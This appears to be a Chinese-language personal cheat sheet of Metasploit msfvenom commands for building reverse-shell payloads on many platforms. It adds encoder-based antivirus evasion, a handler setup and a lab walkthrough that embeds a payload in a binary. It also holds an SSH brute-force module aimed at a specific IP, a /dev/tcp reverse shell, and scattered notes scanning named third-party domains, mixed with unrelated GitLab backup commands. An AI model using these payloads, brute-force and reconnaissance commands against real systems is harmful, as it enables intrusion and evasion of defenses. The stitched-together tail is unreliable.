msf 生成payload代码

shellter 嵌套安装程序，免杀



msfvenom -l



Binaries:



Linux



msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf

Windows



msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe

Mac



msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho



Web Payloads

PHP



msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php



cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php

ASP



msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp

JSP



msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp

WAR



msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war



Scripting Payloads

Python



msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py

Bash



msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh

Perl



msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl

Shellcode:



For all shellcode see ‘msfvenom –help-formats’ for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.



Linux Based Shellcode



msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>

Windows Based Shellcode



msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>



Mac Based Shellcode



msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>

Handlers



Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format.



use exploit/multi/handler



set PAYLOAD <Payload name>



set LHOST <LHOST value>



set LPORT <LPORT value>



set ExitOnSession false



exploit -j -z







1、爆破密码

use auxiliary/scanner/ssh/ssh_login



set user_file /tmp/data/user

set pass_file /tmp/data/new.txt

set RHOSTS 23.225.154.246

run





















Windows:



msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=

攻击机IP LPORT=攻击机端口 -e x86/shikata_ga_nai -b '\x00\x0a\xff' -i 3 -f exe -o

payload.exe



Linux:

msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=攻

击机IP LPORT=攻击机端口 -f elf -o payload.elf



MAC OS:

msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=攻击机IP

LPORT=攻击机端口 -f macho -o payload.macho

Android:



msfvenom -a x86 --platform Android -p android/meterpreter/reverse_tcp LHOST=攻

击机IP LPORT=攻击机端口 -f apk -o payload.apk

PowerShell:



msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=

攻击机IP LPORT=攻击机端口 -e cmd/powershell_base64 -i 3 -f raw -o payload.ps1

PHP:



msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=

<Your Port to Connect On> -f raw > shell.php

	

cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >>

shell.php



ASP.net:



msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=

攻击机IP LPORT=攻击机端口 -f aspx -o payload.aspx

JSP:



msfvenom --platform java -p java/jsp_shell_reverse_tcp LHOST=攻击机IP LPORT=攻

击机端口 -f raw -o payload.jsp

War:





msfvenom -p java/jsp_shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -

o payload.war

Node.js:



msfvenom -p nodejs/shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -o

payload.js

Python:



msfvenom -p python/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -

f raw -o payload.py

Perl:



msfvenom -p cmd/unix/reverse_perl LHOST=攻击机IP LPORT=攻击机端口 -f raw -o

payload.pl

Ruby:



msfvenom -p ruby/shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -o

payload.rb

Lua:



msfvenom -p cmd/unix/reverse_lua LHOST=攻击机IP LPORT=攻击机端口 -f raw -o

payload.lua



### 生成 ShellCode

Windows ShellCode:



msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=

攻击机IP LPORT=攻击机端口 -f c

linux shellcode:



msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=攻

击机IP LPORT=攻击机端口 -f c

mac shellcode:



msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=攻击机IP

LPORT=攻击机端口 -f c

Bash shellcode:



[root@localhost ~]# msfvenom -p cmd/unix/reverse_bash LHOST=192.168.1.30 LPORT=8888 > -f raw > payload.sh

[root@localhost ~]# exec 5<>/dev/tcp/xx.xx.xx.xx/xx

[root@localhost ~]# cat <&5 | while read line; do $line 2>&5 >&5; done

Python shellcode



msf5 > use exploit/multi/script/web_delivery

msf5 exploit(multi/script/web_delivery) > set srvhost 192.168.1.30

srvhost => 192.168.1.30

msf5 exploit(multi/script/web_delivery) > set lhost 192.168.1.30

lhost => 192.168.1.30

msf5 exploit(multi/script/web_delivery) > set uripath lyshark

uripath => lyshark

msf5 exploit(multi/script/web_delivery) > exploit -j -z



















使用MSF生成shellcode

payload和shellcode的区别

Payload是是包含在你用于一次漏洞利用（exploit）中的ShellCode中的主要功能代码。因为Payload是包含在ShellCode中的，ShellCode是真正的被输入到存在漏洞的程序中的，并且ShellCode负责把程序的流程最终转移到你的Payload代码中。所以对于一个漏洞来说，ShellCode就是一个用于某个漏洞的二进制代码框架，有了这个框架你可以在这个ShellCode中包含你需要的Payload来做一些事情。



利用msfvenom生成payload

给个中文版的msfvenom的命令行选项：



Options:

    -p, --payload    <payload>       指定需要使用的payload(攻击荷载)。如果需要使用自定义的payload，请使用&#039;-&#039;或者stdin指定

    -l, --list       [module_type]   列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, all

    -n, --nopsled    <length>        为payload预先指定一个NOP滑动长度

    -f, --format     <format>        指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)

    -e, --encoder    [encoder]       指定需要使用的encoder（编码器）

    -a, --arch       <architecture>  指定payload的目标架构

        --platform   <platform>      指定payload的目标平台

    -s, --space      <length>        设定有效攻击荷载的最大长度

    -b, --bad-chars  <list>          设定规避字符集，比如: &#039;\x00\xff&#039;

    -i, --iterations <count>         指定payload的编码次数

    -c, --add-code   <path>          指定一个附加的win32 shellcode文件

    -x, --template   <path>          指定一个自定义的可执行文件作为模板

    -k, --keep                       保护模板程序的动作，注入的payload作为一个新的进程运行

        --payload-options            列举payload的标准选项

    -o, --out   <path>               保存payload

    -v, --var-name <name>            指定一个自定义的变量，以确定输出格式

        --shellest                   最小化生成payload

    -h, --help                       查看帮助选项

        --help-formats               查看msf支持的输出格式列表

首先我们用到的第一个选项是-l，查看所有msf可用的payload列表。里面有526种payload，我们需要的payload功能是获取反弹连接shell。



想要找到可用的payload首先要知道靶机的版本。在网上找方法查了一下，我开的另外一台kali靶机是64位。对应linux64位可用的payload有这些。



image



根据这些payload的功能描述，找出我们需要的payload，使用-p指定。给大家翻译了一下这些描述啥意思，如下：



- execute an arbitrary command    

执行一个任意命令

- Inject the mettle server payload(staged).Listen to a connection. 

注入mettle server payload，监听等待一个连接。

- Inject the mettle server payload(staged).Connect back to a connection. 

注入mettle server payload，反弹连接一个连接。

- run the meterpreter /Mettle server payload (stageless) 

运行meterpreter或者Mettle server payload

- spawn a command shell.Listen to a connection.   

产生一个shell，等待连接。

- spawn a command shell.Connect back to a connection. 

产生一个shell，反弹连接一个连接。

- Listen for a connection in a random port and spawn a command shell. Use nmap to discover the open port: 'nmap -sS target -p-'.

在一个随机端口监听一个连接，并产生一个shell。

- Spawn a shell on an established connection

在已经存在的连接上产生一个shell

- Connect back to attacker and spawn a command shell

反弹连接攻击者，并产生一个shell。

很显然我们选择最后一个，linux/x64/shell_reverse_tcp.



选定了payload，我们需要给它写一些什么参数呢？用这个指令查看



msfvenom -p windows/meterpreter/reverse_tcp --payload-options

image



基础参数就两个LHOST和LPORT。跟在payloa后面设置一下就可以了。



选好了payload，接下来我们-f选payload的输出格式。用这个指令可以查看payload有哪些输出格式。



msfvenom --help-formats

发现有很多：

image



我们的目标是注入到pwn1里去，当然选择ELF格式了！



还可以用-e选择编码器和-i迭代编码的次数。用这个指令查看可用的编码方式。



msfvenom -l encoders

但ELF文件的编码方式应该是机器无关的，不用选这个选项。



最后呢，当然是要用-x参数指定我们的模板pwn1.payload(shellcode)就写入到pwn1这个可执行文件中。



所以，最终我们的指令是



msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.226.129 LPORT=4444 -x /root/20155225/pwn1 -f elf -o pwn2

然后把我们毒化的pwn2，复制到靶机里。

打开攻击方的msfconsole，加载exploit/multi/handler模块，设置参数，最后一个exploit指令！攻击！



但是一切似乎不如人意，我在靶机上运行了pwn2,控制机没有任何反应……



然后又在网上找了这篇文章msfvenom生成各类Payload命令，里面说linux里指令要这样写



msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf

对比之后，我意识到，虽然linux系统是64位，但pwn1是个32位程序啊！所以还是用x86下面的payload。



最终的指令是这样的：



msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.226.129 LPORT=4444 -x /root/20155225/pwn1 -f elf > pwn3





















https://reg.ontologycash.com/#/register?inviteCode=3604R

http://web.bitstarncoin.com/Down/IndexCN

http://game.bbtplayer.com/?lang=zh-cn



web.bitstarncoin.com

reg.ontologycash.com

game.bbtplayer.com



web.bitstarncoin.com/robots.txt

reg.ontologycash.com/robots.txt

game.bbtplayer.com/robots.txt



cat list | while read line; echo $line; done

cat file | while read line; do echo $line; done





docker exec -t <your container name> /bin/sh -c 'umask 0077; tar cfz /secret/gitlab/backups/$(date "+etc-gitlab-\%s.tgz") -C / etc/gitlab'

docker exec -t gitlab gitlab-backup create

bundle exec rake gitlab:backup:restore RAILS_ENV=production







dmitry -p web.bitstarncoin.com -f -b

dmitry -p reg.ontologycash.com -f -b

dmitry -p game.bbtplayer.com -f -b